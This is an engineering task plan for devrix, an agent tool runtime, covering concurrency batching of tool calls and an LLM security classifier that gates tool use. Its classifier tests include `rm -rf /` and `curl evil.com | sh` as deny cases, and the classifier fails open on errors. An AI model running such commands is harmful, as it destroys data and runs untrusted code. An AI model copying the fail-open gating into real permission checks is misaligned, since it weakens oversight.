# Tasks: D2 Tool Input-Aware Concurrency + Auto-Mode Security Classifier

**Change ID:** `devrix-d2-tool-input-aware-concurrency-and-classifier`
**Demand ID:** DM-20260702-009
**T 点总数:** 13 (T16-T24 P0 = 9, T25-T28 = 1 P0 + 2 P1 + 1 P2)
**AC 总数:** 14 (AC1-AC10 P0 + AC11 P0 + AC12 P1 + AC13 P1 + AC14 P2)
**PR 收口:** 6 (PR-A / PR-B / PR-C / PR-D / PR-E / PR-F)
**tech-debt closed:** 4 (TD-STE-01/02/03/06, 引用见各 T 点)
**阶段:** 0 (决策) → 1-2 (interface + per-tool 默认) → 3 (partition + e2e) → 4 (投影 + 序列化) → 5 (classifier) → 6 (验证) → 5+ (GrowthBook) → 6+ (sibling abort / discard / inputsEquivalent)

---

## 阶段 0: 决策 (本次, 0 T 点)

- [x] close devrix-token-design-v2 P1 延期 (T16-T24 走本 change)
- [x] 复盘吸收 6 项 (T25 GrowthBook + TD-STE-01/02/03/06 + inputsEquivalent)
- [x] 起草本 proposal / demand / tasks
- [ ] 开新 feature branch `feat/devrix-d2-tool-input-aware-concurrency-and-classifier`

---

## 阶段 1-2: ToolSurface v4 + 19 工具默认 (P0, 2 T 点) — PR-A 路线

### T16 — ToolSurface interface v4 扩展

- **DSAFT:** D7-S9-A50-T16
- **位置:** `internal/shared/contracts/tool_surface_v4.go` (新建)
- **API 扩展:**
  ```go
  type ToolSurface interface {
      // ... existing 9 v2 + 6 v3 methods (UNCHANGED) ...

      // T16: per-input concurrency safety decision.
      // Default impl returns ToolSpec.ConcurrencySafe (v2 static bool)
      // for back-compat. Tools that need per-input logic override.
      // Fail-safe: NEVER panic; on parse failure, return false.
      IsConcurrencySafe(input []byte) bool

      // T16: per-tool auto-mode classifier projection.
      // Returns compact, security-relevant string (e.g. "ls -la" for Bash).
      // Returns '' to skip this tool in classifier transcript.
      // Fail-safe: on parse failure, return raw input + emit metric.
      ToAutoClassifierInput(input []byte) string
  }
  ```
- **仿:** clawcode `src/Tool.ts:402,556` interface + `src/Tool.ts:759,767` TOOL_DEFAULTS (`(_input?: unknown) => false` / `(_input?: unknown) => ''`)
- **AC:** 19 surface 全部加默认实现 (T17), 不破坏现有 19 工具的行为 (ConcurrencySafe bool 兼容)
- **tech-debt 引用:** TD-STE-06 partial (interface 框架, T17 完成 close)

### T17 — 19 工具 surface 默认实现

- **DSAFT:** D7-S9-A50-T17
- **位置:** `internal/layers/contextengine/enforce/tools/surface/orthogonal_flags_v2.go` (新建) + 19 surface
- **19 surface 分布:**
  - `BuiltinSurface` (6): bash/write/edit/read/grep/glob
  - `LSPToolSurface` (5): lsp_goto_definition/hover/references/workspace_symbol/code_action
  - `FreeForkSurface` (1): free_fork
  - `TrackerSurface` (1): tracker
  - `VerifySurface` (1): verify_*
  - `AskUserSurface` (1): ask_user_question
  - `BackgroundTaskSurface` (1): background_task
  - `ToolSearchSurface` (1): tool_search
  - `PluginSurface` (3+): web_fetch/web_search/etc.
- **19 工具 default table:**

  | 工具 | IsConcurrencySafe(input) | ToAutoClassifierInput(input) |
  |------|--------------------------|------------------------------|
  | read_file | true (per-input 决定: <8K → true, ≥8K → 串行) | "" (无安全相关性, 跳过) |
  | grep | true (read-only) | "" (无安全相关性, 跳过) |
  | glob | true (read-only) | "" (无安全相关性, 跳过) |
  | bash | per-input: isReadOnlyBashCommand(command) → true/false | command (e.g. "ls -la") |
  | write_file | false (写并发会乱序) | "path: content (first 200 chars)" |
  | edit_file | false (写并发会乱序) | "path: old → new (first 200 chars)" |
  | lsp_goto_definition | true (read-only) | "" (无安全相关性, 跳过) |
  | lsp_hover | true (read-only) | "" (无安全相关性, 跳过) |
  | lsp_references | true (read-only) | "" (无安全相关性, 跳过) |
  | lsp_workspace_symbol | true (read-only) | "" (无安全相关性, 跳过) |
  | lsp_code_action | false (LSP action 触发 server side-effect) | "action: kind" |
  | free_fork | false (spawn 副作用) | "agent: prompt (first 200 chars)" |
  | tracker | true (read-only) | "" (无安全相关性, 跳过) |
  | verify_* | false (重资源) | "verify: kind" |
  | ask_user_question | false (interactive) | "question: text" |
  | background_task | false (spawn 副作用) | "task: description" |
  | tool_search | true (read-only) | "" (无安全相关性, 跳过) |
  | web_fetch | false (per-host rate-limit + 网络副作用) | "url" |
  | web_search | false (per-host rate-limit) | "query" |
  | mcp_* | false (保守, 未知 mcp server 协议) | "server.tool: input (first 200 chars)" |

- **仿:** clawcode `src/Tool.ts:402,556` + `src/tools/BashTool/BashTool.tsx:434-442` (Bash 实例)
- **AC:** 19 surface 加默认实现, `surface_metadata_gate_test.go` 加 1 case (AC8: 0 silent default)
- **tech-debt 引用:** **TD-STE-06 closed-by** (per-tool `IsConcurrencySafe` 走 surface 元数据, 跟 clawcode `Tool` interface 一致)

---

## 阶段 3: partitionToolCalls + 50 文件 e2e (P0, 2 T 点) — PR-B 路线

### T18 — ChannelRouter partitionToolCalls 改造

- **DSAFT:** D7-S9-A50-T18
- **位置:** `internal/bootstrap/turn_adapter.go:277` 改造 + `partition_tool_calls.go` (新建 helper)
- **API:**
  ```go
  // partitionToolCalls mirrors clawcode toolOrchestration.ts:84-118.
  // Consecutive concurrency-safe tool calls go into the same batch;
  // the next non-safe call starts a new batch. Each batch runs
  // concurrently (errgroup); batches run sequentially to preserve
  // LLM-issued ordering within non-safe regions.
  func partitionToolCalls(
      calls []ToolCall,
      surfaces map[string]ToolSurface,
  ) []Batch {
      type Batch struct {
          IsConcurrencySafe bool
          Calls             []ToolCall
      }
      var batches []Batch
      for _, call := range calls {
          s := surfaces[call.Name]
          input := parseInput(call.Input)
          safe := s.IsConcurrencySafe(input)
          if safe && len(batches) > 0 && batches[len(batches)-1].IsConcurrencySafe {
              batches[len(batches)-1].Calls = append(batches[len(batches)-1].Calls, call)
          } else {
              batches = append(batches, Batch{IsConcurrencySafe: safe, Calls: []ToolCall{call}})
          }
      }
      return batches
  }
  ```
- **ExecuteRound 改造:** 替换单层 errgroup 为两层 (batch 间串行 + batch 内并发)
- **仿:** clawcode `src/services/tools/toolOrchestration.ts:84-118` `partitionToolCalls` + `:26-32` batch consume
- **AC:** 50 read_file 拆成 ~10 batch (假设 9 并发阈值), 总时间 < 串行 / 3 (AC3)
- **tech-debt 引用:** **TD-STE-01 closed-by** (混合批次: safe × N 并行 + unsafe 独占, 替换 v1 整批 all-or-nothing)

### T19 — 50 文件 e2e 并发版

- **DSAFT:** D7-S9-A50-T19
- **位置:** `internal/layers/contextengine/prepare/compression/review50_e2e_concurrent_test.go` (新建)
- **行为:** 复用 T27 fixture (50 line-numbered 文件), 在 ExecuteRound 改 partition 后跑 9 并发 read_file
- **AC:** 50/50 完成, 总 wall time < 串行 / 3 (AC10)
- **老 e2e (T27) 保留做回归基线**

---

## 阶段 4: ToAutoClassifierInput + toCompactBlock (P0, 2 T 点) — PR-C 路线

### T20 — toCompactBlock JSONL 序列化

- **DSAFT:** D7-S10-A50-T20
- **位置:** `internal/layers/orchestration/decisionplanning/to_compact_block.go` (新建)
- **API:**
  ```go
  // toCompactBlock mirrors clawcode yoloClassifier.ts:378-410.
  // Serializes one transcript block as a JSON dict line: `{"Bash":"ls"}`
  // for tool calls, `{"user":"text"}` for user text. The tool value is
  // the per-tool ToAutoClassifierInput projection. JSON escaping means
  // hostile content can't break out of its string context to forge a
  // `{"user":...}` line.
  func toCompactBlock(
      block TranscriptBlock,
      role string,
      surfaceLookup map[string]ToolSurface,
  ) string {
      if block.Type == "tool_use" {
          s, ok := surfaceLookup[block.Name]
          if !ok {
              return "" // unknown tool, skip
          }
          encoded, err := safeToAutoClassifierInput(s, block.Input)
          if err != nil {
              metrics.AutoModeMalformedToolInput(block.Name).Inc()
              encoded = string(block.Input) // fail-open
          }
          line, _ := json.Marshal(map[string]string{block.Name: encoded})
          return string(line)
      }
      text := extractTextContent(block)
      line, _ := json.Marshal(map[string]string{role: text})
      return string(line)
  }
  ```
- **fail-safe wrapper:**
  ```go
  func safeToAutoClassifierInput(s ToolSurface, input []byte) (string, error) {
      var result string
      var err error
      func() {
          defer func() {
              if r := recover(); r != nil {
                  err = fmt.Errorf("panic: %v", r)
              }
          }()
          result = s.ToAutoClassifierInput(input)
      }()
      return result, err
  }
  ```
- **仿:** clawcode `src/utils/permissions/yoloClassifier.ts:378-410`
- **AC:** 6 case (tool_use_ok, user_text, malformed_input, empty, escape_attack, unknown_tool) PASS

### T21 — 19 工具 ToAutoClassifierInput 默认实现

- **DSAFT:** D7-S10-A50-T21
- **位置:** 19 surface 加 ToAutoClassifierInput 方法 (T17 同步落地)
- **fail-safe:** parse failure → 返回 raw input + emit `auto_mode.malformed_tool_input` metric
- **19 工具 table:** 见 T17 表格
- **AC:** 19 surface 全部加 ToAutoClassifierInput 默认, 0 panic (panic recovery test 覆盖)

---

## 阶段 5: Auto-Mode Classifier (P0, 2 T 点) — PR-D 路线

### T22 — AutoModeClassifier 实现

- **DSAFT:** D7-S10-A50-T22
- **位置:** `internal/layers/orchestration/decisionplanning/auto_classifier.go` (新建)
- **API:**
  ```go
  type AutoModeClassifier interface {
      ClassifyToolUse(ctx context.Context, transcript []TranscriptBlock) (YoloResult, error)
  }

  type YoloResult struct {
      Decision YoloDecision // Allow | Deny
      Reason   string       // LLM 解释
      Source   string       // "anthropic" | "external" | "rule-fallback"
  }

  type YoloDecision int

  const (
      YoloAllow YoloDecision = iota
      YoloDeny
  )
  ```
- **sideQuery (复用 main loop LLM gateway):**
  ```go
  func (c *AutoModeClassifierImpl) sideQuery(
      ctx context.Context,
      prompt string,
      transcript string,
  ) (YoloResult, error) {
      ctx, cancel := context.WithTimeout(ctx, 5*time.Second) // 硬上限
      defer cancel()

      resp, err := c.gateway.Complete(ctx, llmgateway.Request{
          Model:    c.config.ClassifierModel,
          System:   prompt,
          Messages: []Message{{Role: "user", Content: transcript}},
      })
      if err != nil {
          // fail-open + metric
          metrics.AutoModeClassifierUnavailable().Inc()
          return YoloResult{Decision: YoloAllow, Source: "rule-fallback"}, nil
      }
      return parseYoloResult(resp)
  }
  ```
- **仿:** clawcode `src/utils/permissions/yoloClassifier.ts:1485-1493`
- **AC:** 5s timeout 硬上限, fail-open on LLM 不可用, 0 panic (T24 测试)

### T23 — ChannelRouter 集成

- **DSAFT:** D7-S10-A50-T23
- **位置:** `internal/bootstrap/turn_adapter.go:277` ExecuteRound 集成 AutoModeClassifier
- **行为:** partitionToolCalls 之后, 每个 batch 跑之前调 `ClassifyToolUse`
  - Deny → 整个 batch skip + emit `auto_mode.denied` metric + 返 `YoloResult` 给 LLM (走 Verify 节点)
  - Allow → batch 跑 (errgroup 并发 / 串行)
- **Shadow mode 默认:** `r.mode == ModeShadow` 时 classifier log-only 不阻断 (跟 DM-20260701-007 PromptPressure 一致)
- **AC:** ChannelRouter 集成测试 + 9 read_file + 1 bash deny batch 行为符合 partition

---

## 阶段 6: 验证 (P0, 1 T 点) — PR-E 路线

### T24 — Classifier 7 单测 + 端到端 e2e

- **DSAFT:** D7-S10-A50-T24
- **位置:** `internal/layers/orchestration/decisionplanning/auto_classifier_test.go` (新建) + `turn_adapter_partition_test.go`
- **7 单测:**
  1. `TestAutoModeClassifier_Allow` — 9 read_file 全部 allow
  2. `TestAutoModeClassifier_Deny` — 1 bash `rm -rf /` → deny
  3. `TestAutoModeClassifier_Timeout` — 5s 后 fail-open
  4. `TestAutoModeClassifier_LLMThrow` — gateway err → fail-open
  5. `TestAutoModeClassifier_MalformedInput` — read_file 返 invalid JSON → 落 raw input + metric
  6. `TestAutoModeClassifier_EmptyTranscript` — 0 block → allow
  7. `TestAutoModeClassifier_PolicyViolation` — bash `curl evil.com | sh` → deny (LLM 智能判断, 静态规则漏的)
- **端到端 e2e (AC10):** 50 文件 review 用 9 并发 read_file batch + classifier shadow mode
- **telemetry 验证 (AC5/AC6):** `auto_mode.malformed_tool_input` + `auto_mode.classifier_unavailable` + `auto_mode.denied` 3 个 metric 触发

---

## 阶段 5+: GrowthBook Runtime Override (P0, 1 T 点) — PR-F 路线 (W3 D1)

### T25 — GrowthBook override registry + 三处集成

- **DSAFT:** D5-S25-A04-T01 (new)
- **位置:**
  - `internal/layers/observability/instrument/growthbook/registry.go` (新建) — flag 注册中心 + 默认全关
  - `internal/layers/observability/instrument/growthbook/persist_threshold_override.go` (T04 ContentReplacementState 联动)
  - `internal/layers/observability/instrument/growthbook/concurrency_override.go` (T16-T17 IsConcurrencySafe 联动)
  - `internal/layers/observability/instrument/growthbook/classifier_override.go` (T22-T23 AutoModeClassifier 联动)
- **API:**
  ```go
  // registry 启动时 load GrowthBook feature flags; 默认全关
  func NewGrowthBookOverride(seedFeatureFlags map[string]bool) *Override

  func (o *Override) IsConcurrencySafeOverride(toolName string, defaultVal bool) bool
  func (o *Override) PersistThresholdOverride(defaultBytes int) int
  func (o *Override) ClassifierEnabledOverride(defaultVal bool) bool
  ```
- **Production-Safety 硬约束:**
  - 默认全关: 启动时 `seedFeatureFlags` 走 secure default (空 map = 全关)
  - flag 未开启时, override 返回 defaultVal, **0 行为变化** (单测覆盖: `TestGrowthBookOverride_AllFlagsOff_NoBehaviorChange`)
  - flag 运行时变更通过 GrowthBook SDK 推送, 不需要重启 devrix
- **仿:** 借鉴 clawcode `src/utils/permissions/permissions.ts` 走 OS-level override 模式 + devrix 内部 observability/instrument 已有 GrowthBook 适配层
- **AC:** AC11 (growthbook_override_test + 19 工具 default 全覆盖 + Production-Safety 1 单测 PASS)
- **复盘吸收:** 项 #1 (DM-20260702-008 借鉴 #8)

---

## 阶段 6+: Bash Sibling Abort + Discard + inputsEquivalent (P1/P1/P2, 3 T 点) — PR-F 路线 (W3 D1-D2)

### T26 — Bash sibling abort

- **DSAFT:** D7-S9-A50-T25 (new)
- **位置:**
  - `internal/layers/contextengine/enforce/tools/bash/sibling_abort.go` (新建) — `siblingAbortController` 实现
  - `internal/layers/contextengine/enforce/tools/bash/sibling_abort_test.go`
  - `internal/layers/contextengine/enforce/tools/bash/bash_runner.go` 改造点 — 集成 abort 信号
- **API:**
  ```go
  // siblingAbortController mirrors clawcode
  // src/services/tools/StreamingToolExecutor.ts:createChildAbortController.
  // 范围: 仅同 batch 并行 Bash 兄弟, 不 abort 父 QueryLoop turn, 不影响非 Bash 工具
  type SiblingAbortController struct {
      parent context.Context
      mu     sync.Mutex
      kids   map[string]context.CancelFunc  // toolUseID → cancel
  }

  func (s *SiblingAbortController) Spawn(toolUseID string) context.Context
  func (s *SiblingAbortController) AbortSiblings(exceptToolUseID string, reason string)
  ```
- **行为:**
  - Bash 工具启动时注册 `toolUseID` 到 controller
  - 同 batch 内 Bash 失败 → `AbortSiblings` → 兄弟 Bash 的 ctx 被 cancel
  - 兄弟 Bash 检测 ctx.Done() → 立即返 synthetic `tool_result`: `{"is_error": true, "content": "Cancelled: parallel tool call errored"}`
  - 父 QueryLoop turn **不** abort
- **单测覆盖边界:**
  - 集成测试: mock 双 Bash, 第一个 error → 第二个 cancelled
  - 单测: 第一个 error 后父 turn 仍继续 (不 cancel 父 ctx)
  - 单测: 非 Bash 工具不被 abort (e.g. read_file 在同 batch 不受影响)
- **AC:** AC12 PASS
- **复盘吸收:** 项 #4 (TD-STE-02)
- **tech-debt 引用:** **TD-STE-02 closed-by**

### T27 — StreamingToolExecutor.Discard() + fallback 路径 wiring

- **DSAFT:** D7-S9-A50-T26 (new)
- **位置:**
  - `internal/bootstrap/streaming_executor.go` (新建) — `Discard()` 方法
  - `internal/bootstrap/discard_on_fallback.go` (新建) — QueryLoop fallback 路径 wiring
  - `internal/bootstrap/discard_on_fallback_test.go`
- **API:**
  ```go
  // Discard mirrors clawcode StreamingToolExecutor.Discard().
  // 触发时机: QueryLoop 切换 fallback model 前
  // 行为: 在途/queued 工具注入 streaming_fallback synthetic result
  func (e *StreamingToolExecutor) Discard(reason DiscardReason) {
      e.mu.Lock()
      defer e.mu.Unlock()
      for toolUseID, cancel := range e.inflight {
          cancel()
          e.emitSynthetic(toolUseID, ToolResult{
              IsError: true,
              Content: fmt.Sprintf("streaming_fallback: %s", reason),
          })
      }
      e.inflight = map[string]context.CancelFunc{}
      e.queued = e.queued[:0]
  }

  type DiscardReason string  // "model_fallback" | "context_overflow" | "user_abort"
  ```
- **QueryLoop 集成 (依赖 TD-QL-03 已 CLOSED, DM-20260618-010):**
  - 走 QueryLoop fallback path, 在切换 fallback model 前调 `executor.Discard("model_fallback")`
  - 正常路径不触发 (单测覆盖: `TestDiscard_NoFallback_NoDiscard`)
- **AC:** AC13 PASS
- **复盘吸收:** 项 #5 (TD-STE-03)
- **tech-debt 引用:** **TD-STE-03 closed-by** (依赖 TD-QL-03 已 CLOSED)

### T28 — inputsEquivalent(a, b) 19 工具默认实现

- **DSAFT:** D2-S15-A02-T29 (new)
- **位置:**
  - `internal/layers/contextengine/enforce/tools/surface/inputs_equivalent.go` (新建) — 默认按 JSON unmarshal 逐字段比较
  - `internal/layers/contextengine/enforce/tools/surface/inputs_equivalent_test.go` (19 工具 × 3 case = 57 单测)
  - `internal/layers/contextengine/persist/content_replacement_state.go` 改造点 — T04 ContentReplacementState 走 inputsEquivalent 做 cache invalidation 收口
- **API:**
  ```go
  // inputsEquivalent mirrors clawcode Tool.ts:712-714.
  // 默认实现: JSON unmarshal 后 reflect.DeepEqual.
  // 工具可 override (e.g. read_file 可忽略行号/排序, 语义等价)
  func (s *baseSurface) inputsEquivalent(a, b []byte) bool {
      var av, bv any
      if err := json.Unmarshal(a, &av); err != nil {
          return bytes.Equal(a, b)  // parse 失败走 byte 比较 (保守)
      }
      if err := json.Unmarshal(b, &bv); err != nil {
          return false
      }
      return reflect.DeepEqual(normalizeJSON(av), normalizeJSON(bv))
  }
  ```
- **ContentReplacementState 联动 (T04):**
  - 当前 cache key 用 raw input 字符串 → 走 inputsEquivalent 后, 等价输入 (e.g. JSON key 顺序不同) 命中同一 cache entry
  - cache invalidation: 新 input 不等价于任何 entry → 新建 entry; 等价于已存在 entry → 复用
- **19 工具 default:** 跟 clawcode `inputsEquivalent` 一致, 默认按字段比较, 工具不需 override (e.g. read_file path 一致即等价)
- **AC:** AC14 (57 单测 PASS: 19 工具 × [相同 / 字段顺序不同 / 完全不同] 3 case)
- **复盘吸收:** 项 #6 (clawcode 35 字段中未在 devrix 落地的字段)

---

## 验证状态 (本地 — 阶段 6 + 6+ 后)

- [ ] `go build ./...` 0 errors
- [ ] `go test -count=1 ./internal/layers/...` 全量 PASS
- [ ] `go test -race -count=1 ./...` 全量 PASS (master 预存失败 tools/ci-lint-invariant 除外)
- [ ] 13 T 全 IMPLEMENTED + 14 AC 全 PASS
- [ ] 50 文件 e2e 并发版 < 串行 / 3 (AC10)
- [ ] 端到端 partitionToolCalls + AutoModeClassifier shadow mode 集成测试 PASS
- [ ] 4 tech-debt 关闭 (TD-STE-01/02/03/06) — 走 PR-F 同步标注
- [ ] GrowthBook override registry 默认全关单测 PASS (Production-Safety)

---

## 范围外 (OOS, 走 P2/P3 后续 change)

- OOS-NEW-1: Transcript 完整 LLM 上下文 (10+ 工具全 transcript) — P2
- OOS-NEW-2: 多 LLM ensemble (ensemble classifier) — P3
- OOS-NEW-3: 跨 session reputation → classifier input — P2
- OOS-NEW-4: Classifier-driven microcompact (T13 PerMessageBudget 联动) — P2
- OOS-NEW-5: LLM SideQuery 模型选择 (Haiku vs Sonnet) — P2
- OOS-NEW-6: YoloClassifier telemetry 跟 Learn FeedbackMemory 联动 — P2
- OOS-NEW-7: 工具 progress 流 (TD-STE-04) — P2
- OOS-NEW-8: synthetic error 统一 (TD-STE-05) — P2
- OOS-NEW-9: Bash 22 zsh rules 改造 (DM-20260701-007 OOS-7 弱相关) — 域自治
- OOS-NEW-10: Filter v2 workspace 维 (DM-20260701-007 OOS-10) — 走 P1 独立 change

> **OOS 编号变更说明:** 原 OOS-1~7 中 OOS-1 (GrowthBook) 走 T25 已吸收, 重新编号 OOS-NEW-1~10.

---

## 6 PR 收口计划

| PR | commit | 内容 | T 数 | tech-debt closed |
|----|--------|------|------|------------------|
| **PR-A** | (TBD) | T16-T17 ToolSurface v4 + 19 工具 IsConcurrencySafe 默认 | 2 | TD-STE-06 |
| **PR-B** | (TBD) | T18-T19 partitionToolCalls + 50 文件 e2e 并发版 | 2 | TD-STE-01 |
| **PR-C** | (TBD) | T20-T21 toCompactBlock + 19 工具 ToAutoClassifierInput 默认 | 2 | — |
| **PR-D** | (TBD) | T22-T23 AutoModeClassifier + ChannelRouter 集成 | 2 | — |
| **PR-E** | (TBD) | T24 + AC1-AC10 验证 + S5 验收 + S6 归档 | 1 + 10 AC | — |
| **PR-F** | (TBD) | T25 GrowthBook override + T26 Bash sibling abort + T27 Discard on fallback + T28 inputsEquivalent | 4 + 4 AC | TD-STE-02 + TD-STE-03 |
| **合计** | | | **13 T + 14 AC** | **4 tech-debt** |

> **排期 (W3 D1-D2):** PR-F 集中在 W3 头两天, 跟 DM-20260702-008 PR-F Token Design 2.0 收口模式一致 (冲刺结尾批量收口).
